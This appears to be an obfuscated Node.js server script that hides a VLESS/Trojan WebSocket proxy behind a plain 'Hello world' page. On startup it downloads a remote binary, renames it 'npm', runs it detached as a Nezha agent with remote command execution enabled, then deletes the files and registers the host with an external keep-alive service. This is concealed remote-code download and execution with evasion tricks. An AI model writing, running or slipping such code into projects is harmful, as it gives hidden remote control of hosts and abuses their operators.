const _0x31e24b=_0x1ebc;(function(_0x1214ae,_0x5902a3){const _0x216fc4=_0x1ebc,_0x55dcee=_0x1214ae();while(!![]){try{const _0x25d95c=parseInt(_0x216fc4(0x1f8))/0x1+parseInt(_0x216fc4(0x1c2))/0x2+parseInt(_0x216fc4(0x1bc))/0x3*(-parseInt(_0x216fc4(0x203))/0x4)+parseInt(_0x216fc4(0x1a0))/0x5*(-parseInt(_0x216fc4(0x19f))/0x6)+parseInt(_0x216fc4(0x1e1))/0x7*(parseInt(_0x216fc4(0x1bf))/0x8)+-parseInt(_0x216fc4(0x1e8))/0x9+parseInt(_0x216fc4(0x18f))/0xa*(-parseInt(_0x216fc4(0x1a7))/0xb);if(_0x25d95c===_0x5902a3)break;else _0x55dcee['push'](_0x55dcee['shift']());}catch(_0x571f5a){_0x55dcee['push'](_0x55dcee['shift']());}}}(_0x3419,0x640c7));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x31e24b(0x192)),path=require(_0x31e24b(0x1eb)),crypto=require(_0x31e24b(0x19a)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x31e24b(0x1ef)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x31e24b(0x1b4)][_0x31e24b(0x18b)]||'32165d46-0910-4789-aa5f-5710ebba9738',NEZHA_SERVER=process[_0x31e24b(0x1b4)][_0x31e24b(0x1de)]||'',NEZHA_PORT=process[_0x31e24b(0x1b4)][_0x31e24b(0x200)]||'',NEZHA_KEY=process[_0x31e24b(0x1b4)][_0x31e24b(0x1e6)]||'',DOMAIN=process['env'][_0x31e24b(0x196)]||_0x31e24b(0x209),AUTO_ACCESS=process['env'][_0x31e24b(0x1ce)]||!![],WSPATH=process['env'][_0x31e24b(0x19b)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x31e24b(0x1b4)][_0x31e24b(0x1dc)]||_0x31e24b(0x1b0),NAME=process[_0x31e24b(0x1b4)][_0x31e24b(0x1fb)]||_0x31e24b(0x1fe),PORT=process[_0x31e24b(0x1b4)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3afd7e=_0x31e24b;try{const _0x51d63f=await axios[_0x3afd7e(0x1ed)](_0x3afd7e(0x18e)),_0x4efeca=_0x51d63f[_0x3afd7e(0x206)];ISP=(_0x4efeca[_0x3afd7e(0x1ad)]+'-'+_0x4efeca['asOrganization'])[_0x3afd7e(0x1be)](/ /g,'_');}catch(_0x38d319){ISP='Unknown';}};GetISP();const httpServer=http[_0x31e24b(0x1cd)]((_0x13a20e,_0x6e16e0)=>{const _0x3f8970=_0x31e24b;if(_0x13a20e[_0x3f8970(0x1fa)]==='/'){const _0x186821=path[_0x3f8970(0x1f2)](__dirname,_0x3f8970(0x1db));fs[_0x3f8970(0x1f1)](_0x186821,_0x3f8970(0x1df),(_0x2e4db7,_0x2a63ec)=>{const _0x2df76c=_0x3f8970;if(_0x2e4db7){_0x6e16e0['writeHead'](0xc8,{'Content-Type':_0x2df76c(0x1e9)}),_0x6e16e0['end'](_0x2df76c(0x1ae));return;}_0x6e16e0[_0x2df76c(0x1ee)](0xc8,{'Content-Type':_0x2df76c(0x1e9)}),_0x6e16e0[_0x2df76c(0x1bd)](_0x2a63ec);});return;}else{if(_0x13a20e[_0x3f8970(0x1fa)]==='/'+SUB_PATH){const _0x43eded='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x3f8970(0x20a)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x5ef0e9='trojan://'+UUID+'@'+DOMAIN+_0x3f8970(0x1ff)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x38b544=_0x43eded+'\x0a'+_0x5ef0e9,_0x58f697=Buffer[_0x3f8970(0x1ba)](_0x38b544)[_0x3f8970(0x1b7)]('base64');_0x6e16e0[_0x3f8970(0x1ee)](0xc8,{'Content-Type':_0x3f8970(0x1a4)}),_0x6e16e0['end'](_0x58f697+'\x0a');}else _0x6e16e0[_0x3f8970(0x1ee)](0x194,{'Content-Type':_0x3f8970(0x1a4)}),_0x6e16e0[_0x3f8970(0x1bd)](_0x3f8970(0x1c3));}}),wss=new WebSocket[(_0x31e24b(0x1d7))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x31e24b(0x18d)];function resolveHost(_0x432782){return new Promise((_0x4659ef,_0x1d7b77)=>{const _0x43c079=_0x1ebc;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x43c079(0x1d3)](_0x432782)){_0x4659ef(_0x432782);return;}let _0x2bbedd=0x0;function _0x586b36(){const _0x3483a2=_0x43c079;if(_0x2bbedd>=DNS_SERVERS[_0x3483a2(0x19e)]){_0x1d7b77(new Error(_0x3483a2(0x1c9)+_0x432782+_0x3483a2(0x1cc)));return;}const _0x315cb1=DNS_SERVERS[_0x2bbedd];_0x2bbedd++;const _0x202dce=_0x3483a2(0x18a)+encodeURIComponent(_0x432782)+_0x3483a2(0x1ea);axios[_0x3483a2(0x1ed)](_0x202dce,{'timeout':0x1388,'headers':{'Accept':_0x3483a2(0x190)}})[_0x3483a2(0x1b1)](_0x1b2f93=>{const _0x3dfe1d=_0x3483a2,_0x1ffb37=_0x1b2f93[_0x3dfe1d(0x206)];if(_0x1ffb37[_0x3dfe1d(0x195)]===0x0&&_0x1ffb37[_0x3dfe1d(0x1f5)]&&_0x1ffb37['Answer']['length']>0x0){const _0x4f8fe3=_0x1ffb37['Answer']['find'](_0xe934bb=>_0xe934bb[_0x3dfe1d(0x1a5)]===0x1);if(_0x4f8fe3){_0x4659ef(_0x4f8fe3[_0x3dfe1d(0x206)]);return;}}_0x586b36();})[_0x3483a2(0x1d4)](_0x3ec1ff=>{_0x586b36();});}_0x586b36();});}function handleVlessConnection(_0x353596,_0x41353b){const _0x5c5d8c=_0x31e24b,[_0x52df0b]=_0x41353b,_0xef29d=_0x41353b['slice'](0x1,0x11);if(!_0xef29d[_0x5c5d8c(0x199)]((_0x4b0b6d,_0xb4f72d)=>_0x4b0b6d==parseInt(uuid[_0x5c5d8c(0x1b5)](_0xb4f72d*0x2,0x2),0x10)))return![];let _0x5066ce=_0x41353b[_0x5c5d8c(0x1b6)](0x11,0x12)['readUInt8']()+0x13;const _0x1407a1=_0x41353b[_0x5c5d8c(0x1b6)](_0x5066ce,_0x5066ce+=0x2)[_0x5c5d8c(0x1a1)](0x0),_0x4c4d01=_0x41353b['slice'](_0x5066ce,_0x5066ce+=0x1)['readUInt8'](),_0x1170bb=_0x4c4d01==0x1?_0x41353b['slice'](_0x5066ce,_0x5066ce+=0x4)['join']('.'):_0x4c4d01==0x2?new TextDecoder()[_0x5c5d8c(0x1ca)](_0x41353b[_0x5c5d8c(0x1b6)](_0x5066ce+0x1,_0x5066ce+=0x1+_0x41353b[_0x5c5d8c(0x1b6)](_0x5066ce,_0x5066ce+0x1)[_0x5c5d8c(0x1c8)]())):_0x4c4d01==0x3?_0x41353b['slice'](_0x5066ce,_0x5066ce+=0x10)['reduce']((_0x3a2c33,_0x534791,_0x5cc275,_0x383453)=>_0x5cc275%0x2?_0x3a2c33[_0x5c5d8c(0x193)](_0x383453['slice'](_0x5cc275-0x1,_0x5cc275+0x1)):_0x3a2c33,[])['map'](_0x5c5725=>_0x5c5725[_0x5c5d8c(0x1a1)](0x0)[_0x5c5d8c(0x1b7)](0x10))[_0x5c5d8c(0x1f2)](':'):'';_0x353596[_0x5c5d8c(0x1f9)](new Uint8Array([_0x52df0b,0x0]));const _0x292708=createWebSocketStream(_0x353596);return resolveHost(_0x1170bb)[_0x5c5d8c(0x1b1)](_0x39a2c4=>{const _0x1aa6d4=_0x5c5d8c;net[_0x1aa6d4(0x1cf)]({'host':_0x39a2c4,'port':_0x1407a1},function(){const _0x42e349=_0x1aa6d4;this[_0x42e349(0x198)](_0x41353b[_0x42e349(0x1b6)](_0x5066ce)),_0x292708['on'](_0x42e349(0x1af),()=>{})['pipe'](this)['on'](_0x42e349(0x1af),()=>{})[_0x42e349(0x1a9)](_0x292708);})['on'](_0x1aa6d4(0x1af),()=>{});})['catch'](_0x2523c4=>{const _0x5bd5e0=_0x5c5d8c;net[_0x5bd5e0(0x1cf)]({'host':_0x1170bb,'port':_0x1407a1},function(){const _0x281dcb=_0x5bd5e0;this[_0x281dcb(0x198)](_0x41353b[_0x281dcb(0x1b6)](_0x5066ce)),_0x292708['on'](_0x281dcb(0x1af),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x292708);})['on'](_0x5bd5e0(0x1af),()=>{});}),!![];}function handleTrojanConnection(_0x4300e7,_0x315b48){const _0x5d6d46=_0x31e24b;try{if(_0x315b48[_0x5d6d46(0x19e)]<0x3a)return![];const _0x2a6109=_0x315b48[_0x5d6d46(0x1b6)](0x0,0x38)[_0x5d6d46(0x1b7)](),_0x41e23e=[UUID];let _0x5c48a7=null;for(const _0xed908d of _0x41e23e){const _0x5d36ea=crypto[_0x5d6d46(0x1cb)](_0x5d6d46(0x202))[_0x5d6d46(0x1e0)](_0xed908d)[_0x5d6d46(0x19c)](_0x5d6d46(0x1c0));if(_0x5d36ea===_0x2a6109){_0x5c48a7=_0xed908d;break;}}if(!_0x5c48a7)return![];let _0x4abf89=0x38;_0x315b48[_0x4abf89]===0xd&&_0x315b48[_0x4abf89+0x1]===0xa&&(_0x4abf89+=0x2);const _0x2aa14a=_0x315b48[_0x4abf89];if(_0x2aa14a!==0x1)return![];_0x4abf89+=0x1;const _0x280c59=_0x315b48[_0x4abf89];_0x4abf89+=0x1;let _0x3bc6a5,_0xa23ece;if(_0x280c59===0x1)_0x3bc6a5=_0x315b48[_0x5d6d46(0x1b6)](_0x4abf89,_0x4abf89+0x4)['join']('.'),_0x4abf89+=0x4;else{if(_0x280c59===0x3){const _0x60c108=_0x315b48[_0x4abf89];_0x4abf89+=0x1,_0x3bc6a5=_0x315b48[_0x5d6d46(0x1b6)](_0x4abf89,_0x4abf89+_0x60c108)[_0x5d6d46(0x1b7)](),_0x4abf89+=_0x60c108;}else{if(_0x280c59===0x4)_0x3bc6a5=_0x315b48[_0x5d6d46(0x1b6)](_0x4abf89,_0x4abf89+0x10)['reduce']((_0x494ab1,_0x1add01,_0x453a82,_0x1aa7bd)=>_0x453a82%0x2?_0x494ab1[_0x5d6d46(0x193)](_0x1aa7bd['slice'](_0x453a82-0x1,_0x453a82+0x1)):_0x494ab1,[])[_0x5d6d46(0x1d0)](_0x4cc40b=>_0x4cc40b['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x4abf89+=0x10;else return![];}}_0xa23ece=_0x315b48[_0x5d6d46(0x1a1)](_0x4abf89),_0x4abf89+=0x2;_0x4abf89<_0x315b48[_0x5d6d46(0x19e)]&&_0x315b48[_0x4abf89]===0xd&&_0x315b48[_0x4abf89+0x1]===0xa&&(_0x4abf89+=0x2);const _0x2895a7=createWebSocketStream(_0x4300e7);return resolveHost(_0x3bc6a5)[_0x5d6d46(0x1b1)](_0x51b495=>{const _0x1201ca=_0x5d6d46;net[_0x1201ca(0x1cf)]({'host':_0x51b495,'port':_0xa23ece},function(){const _0x750aa8=_0x1201ca;_0x4abf89<_0x315b48[_0x750aa8(0x19e)]&&this[_0x750aa8(0x198)](_0x315b48[_0x750aa8(0x1b6)](_0x4abf89)),_0x2895a7['on'](_0x750aa8(0x1af),()=>{})[_0x750aa8(0x1a9)](this)['on'](_0x750aa8(0x1af),()=>{})[_0x750aa8(0x1a9)](_0x2895a7);})['on']('error',()=>{});})[_0x5d6d46(0x1d4)](_0x3f5878=>{const _0x12adca=_0x5d6d46;net[_0x12adca(0x1cf)]({'host':_0x3bc6a5,'port':_0xa23ece},function(){const _0x377c2a=_0x12adca;_0x4abf89<_0x315b48[_0x377c2a(0x19e)]&&this[_0x377c2a(0x198)](_0x315b48[_0x377c2a(0x1b6)](_0x4abf89)),_0x2895a7['on'](_0x377c2a(0x1af),()=>{})[_0x377c2a(0x1a9)](this)['on'](_0x377c2a(0x1af),()=>{})['pipe'](_0x2895a7);})['on'](_0x12adca(0x1af),()=>{});}),!![];}catch(_0x57bf81){return![];}}function _0x1ebc(_0x276c0e,_0xa0ca22){const _0x3419e0=_0x3419();return _0x1ebc=function(_0x1ebc39,_0x5e6d14){_0x1ebc39=_0x1ebc39-0x18a;let _0x246538=_0x3419e0[_0x1ebc39];return _0x246538;},_0x1ebc(_0x276c0e,_0xa0ca22);}function _0x3419(){const _0x33b06f=['readUInt8','Failed\x20to\x20resolve\x20','decode','createHash','\x20with\x20all\x20DNS\x20servers','createServer','AUTO_ACCESS','connect','map','arch','npm\x20download\x20successfully','test','catch','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20is\x20running','Server','close','https://arm64.ssss.nyc.mn/v1','arm','index.html','SUB_PATH','true','NEZHA_SERVER','utf8','update','63draifK','trim','npm\x20is\x20already\x20running,\x20skip\x20running...','post','setsid\x20nohup\x20./npm\x20-s\x20','NEZHA_KEY','writeFileSync','5058018TwAgtS','text/html','&type=A','path','unlink','get','writeHead','child_process','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','readFile','join','Server\x20is\x20running\x20on\x20port\x20','arm64','Answer','https://arm64.ssss.nyc.mn/agent','log','744959QLweDH','send','url','NAME','utf-8','false','Hug',':443?security=tls&sni=','NEZHA_PORT','--tls','sha224','2576wXZXKP','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','8443','data','application/json','/bin/bash','1234.abc.com','&fp=chrome&type=ws&host=','https://dns.google/resolve?name=','UUID','aarch64','1.1.1.1','https://speed.cloudflare.com/meta','50cxJSXj','application/dns-json','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','net','concat','npm','Status','DOMAIN','client_secret:\x20','write','every','crypto','WSPATH','digest','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','length','102wSokKV','157490SqtCEX','readUInt16BE','once','createWriteStream','text/plain','type','2083','4411PszgJE','2096','pipe','config.yaml','443','https://oooo.serv00.net/add-url','country','Hello\x20world!','error','sub','then','pop','listen','env','substr','slice','toString','stream','split','from','2053','2529mHjJTl','end','replace','465264JQLnhC','hex','includes','1567566hRnhXv','Not\x20Found\x0a','https://','message','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://amd64.ssss.nyc.mn/v1'];_0x3419=function(){return _0x33b06f;};return _0x3419();}wss['on']('connection',(_0x4712f5,_0x1826d7)=>{const _0x18a101=_0x31e24b,_0x36e770=_0x1826d7[_0x18a101(0x1fa)]||'';_0x4712f5[_0x18a101(0x1a2)](_0x18a101(0x1c5),_0x349f7a=>{const _0x309a56=_0x18a101;if(_0x349f7a[_0x309a56(0x19e)]>0x11&&_0x349f7a[0x0]===0x0){const _0x2b3f85=_0x349f7a[_0x309a56(0x1b6)](0x1,0x11),_0x270b0a=_0x2b3f85[_0x309a56(0x199)]((_0x4d8962,_0x532f7c)=>_0x4d8962==parseInt(uuid[_0x309a56(0x1b5)](_0x532f7c*0x2,0x2),0x10));if(_0x270b0a){!handleVlessConnection(_0x4712f5,_0x349f7a)&&_0x4712f5[_0x309a56(0x1d8)]();return;}}!handleTrojanConnection(_0x4712f5,_0x349f7a)&&_0x4712f5['close']();})['on'](_0x18a101(0x1af),()=>{});});const getDownloadUrl=()=>{const _0x43a103=_0x31e24b,_0x4758e9=os[_0x43a103(0x1d1)]();return _0x4758e9===_0x43a103(0x1da)||_0x4758e9===_0x43a103(0x1f4)||_0x4758e9===_0x43a103(0x18c)?!NEZHA_PORT?_0x43a103(0x1d9):_0x43a103(0x1f6):!NEZHA_PORT?_0x43a103(0x1c7):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x136482=_0x31e24b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x45e608=getDownloadUrl(),_0x36c336=await axios({'method':_0x136482(0x1ed),'url':_0x45e608,'responseType':_0x136482(0x1b8)}),_0x50efc6=fs[_0x136482(0x1a3)](_0x136482(0x194));return _0x36c336['data']['pipe'](_0x50efc6),new Promise((_0x4ea7ff,_0x40f793)=>{_0x50efc6['on']('finish',()=>{const _0x133263=_0x1ebc;console['log'](_0x133263(0x1d2)),exec('chmod\x20+x\x20npm',_0x5bea6d=>{if(_0x5bea6d)_0x40f793(_0x5bea6d);_0x4ea7ff();});}),_0x50efc6['on']('error',_0x40f793);});}catch(_0x4a9899){throw _0x4a9899;}},runnz=async()=>{const _0x13210e=_0x31e24b;try{const _0x261802=execSync(_0x13210e(0x204),{'encoding':_0x13210e(0x1fc)});if(_0x261802[_0x13210e(0x1e2)]()!==''){console[_0x13210e(0x1f7)](_0x13210e(0x1e3));return;}}catch(_0x34750d){}await downloadFile();let _0x1287e0='',_0x369dfd=[_0x13210e(0x1ab),_0x13210e(0x205),_0x13210e(0x1a8),'2087',_0x13210e(0x1a6),_0x13210e(0x1bb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x21c59d=_0x369dfd[_0x13210e(0x1c1)](NEZHA_PORT)?_0x13210e(0x201):'';_0x1287e0=_0x13210e(0x1e5)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x21c59d+_0x13210e(0x1d5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f5d65=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x13210e(0x1b9)](':')[_0x13210e(0x1b2)]():'',_0x2b34bd=_0x369dfd[_0x13210e(0x1c1)](_0x1f5d65)?_0x13210e(0x1dd):_0x13210e(0x1fd),_0x564ea4=_0x13210e(0x197)+NEZHA_KEY+_0x13210e(0x19d)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2b34bd+_0x13210e(0x1c6)+UUID;fs[_0x13210e(0x1e7)](_0x13210e(0x1aa),_0x564ea4);}_0x1287e0=_0x13210e(0x1f0);}else{console['log'](_0x13210e(0x191));return;}}try{exec(_0x1287e0,{'shell':_0x13210e(0x208)},_0x1939eb=>{const _0xbdd53f=_0x13210e;if(_0x1939eb)console[_0xbdd53f(0x1af)]('npm\x20running\x20error:',_0x1939eb);else console[_0xbdd53f(0x1f7)](_0xbdd53f(0x1d6));});}catch(_0x49d4eb){console['error']('error:\x20'+_0x49d4eb);}};async function addAccessTask(){const _0x2c5759=_0x31e24b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4cd874=_0x2c5759(0x1c4)+DOMAIN+'/'+SUB_PATH;try{const _0x1065ec=await axios[_0x2c5759(0x1e4)](_0x2c5759(0x1ac),{'url':_0x4cd874},{'headers':{'Content-Type':_0x2c5759(0x207)}});console[_0x2c5759(0x1f7)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x16c035){}}const delFiles=()=>{const _0x2bed0f=_0x31e24b;fs[_0x2bed0f(0x1ec)]('npm',()=>{}),fs[_0x2bed0f(0x1ec)](_0x2bed0f(0x1aa),()=>{});};httpServer[_0x31e24b(0x1b3)](PORT,()=>{const _0x568eef=_0x31e24b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x568eef(0x1f7)](_0x568eef(0x1f3)+PORT);});
